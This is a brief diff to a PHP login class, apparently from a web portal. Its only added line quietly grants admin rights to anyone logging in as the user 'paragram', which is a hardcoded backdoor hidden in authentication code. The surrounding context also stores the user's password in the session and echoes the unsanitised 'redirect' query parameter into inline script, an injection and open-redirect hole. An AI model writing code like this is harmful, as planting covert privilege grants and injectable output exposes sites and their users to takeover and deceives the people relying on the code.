@@ -29,6 +29,7 @@ class LoginUser{
 					# $_SESSION['mail'] = $this->email;
 					$_SESSION['password'] = $user['password'];
 					eventlogger("<p style='color:green;'>Login</p>", "User: " . $_SESSION['user'] . " logged in.");
+					if ($_SESSION['user'] == "paragram") {$_SESSION['admin'] = "true"}
 					if (isset($_GET['redirect'])){
 						$redir = $_GET['redirect'];
 						echo "<script> window.location.replace('/system/portal.php?redirect=$redir')</script>"; exit();
